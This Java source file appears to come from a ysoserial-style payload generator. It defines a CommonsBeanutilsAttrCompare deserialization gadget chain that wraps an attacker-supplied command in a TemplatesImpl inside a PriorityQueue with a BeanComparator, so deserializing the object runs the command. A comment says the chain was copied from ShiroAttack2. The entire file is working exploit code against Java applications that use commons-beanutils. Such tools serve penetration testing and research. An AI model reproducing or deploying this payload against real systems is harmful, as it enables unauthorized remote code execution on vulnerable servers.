package A.R.ysogate.payloads.gadgets;

import A.R.ysogate.payloads.utils.PayloadRunner;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Gadgets;
import A.R.ysogate.payloads.utils.Reflections;

import java.util.PriorityQueue;

/**
 * 从 https://github.com/SummerSec/ShiroAttack2/ 中抄来的链子
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({"水滴"})
public class CommonsBeanutilsAttrCompare implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		final Object     template     = Gadgets.createTemplatesImpl(command);
		AttrNSImpl       attrNS1      = new AttrNSImpl();
		CoreDocumentImpl coreDocument = new CoreDocumentImpl();
		attrNS1.setValues(coreDocument, "1", "1", "1");

		BeanComparator beanComparator = new BeanComparator(null, new AttrCompare());

		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

		queue.add(attrNS1);
		queue.add(attrNS1);

		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		return queue;
	}
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsAttrCompare.class, args);
	}
}